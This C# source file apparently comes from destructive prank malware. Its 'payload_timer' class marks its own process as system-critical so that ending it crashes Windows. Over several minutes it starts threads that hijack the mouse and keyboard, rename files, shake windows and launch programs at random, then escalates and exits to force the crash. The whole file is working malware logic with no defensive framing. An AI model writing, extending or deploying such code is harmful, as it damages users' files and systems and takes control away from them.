using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace version1
{
    public class payload_timer
    {
        public static bool rapid_mouse, rapid_crazy, rapid_gdi, extreme = false;
      
        public void timer()
        {
            Process.EnterDebugMode();
            Dll_Imports.NtSetInformationProcess(Process.GetCurrentProcess().Handle, Dll_Imports.BreakOnTermination, ref Dll_Imports.isCritical, sizeof(int));
            string[] process = { @"C:\Windows\notepad.exe", @"C:\Windows\explorer.exe", 
            @"C:\Windows\System32\cmd.exe", @"C:\Windows\System32\calc.exe", @"C:\Windows\System32\mspaint.exe"};
            Random rand;
            var rnd_mouse_h = new random_mouse();
            var rnd_file_h = new random_file();
            var window_h = new gdi_payload();
            Thread th_rnd_mouse = new Thread(rnd_mouse_h.mouse_ev);
            Thread th_rnd_file = new Thread(rnd_file_h.rename_files);
            Thread th_window = new Thread(window_h.window_shake);
            Thread th_crazy = new Thread(rnd_mouse_h.crazy_keyboard);
            for (int count = 0; count < 367; count++)
            {
                rand = new Random();
                if (count == 30) { th_rnd_mouse.Start(); }
                else if (count == 60) { th_rnd_file.Start(); }
                else if (count == 120) { th_window.Start(); }
                else if (count == 180) { th_crazy.Start(); }
                else if (count == 240) { rapid_mouse = true; rapid_gdi = true; }
                else if (count == 300) { rapid_crazy = true; }
                else if (count == 340) { extreme = true; }
                if (count > 120 && rand.Next(10) == 1) { Process.Start(process[rand.Next(process.Length)]); }
                Thread.Sleep(1000);
            }
            Environment.Exit(-1);
        }
    }
}
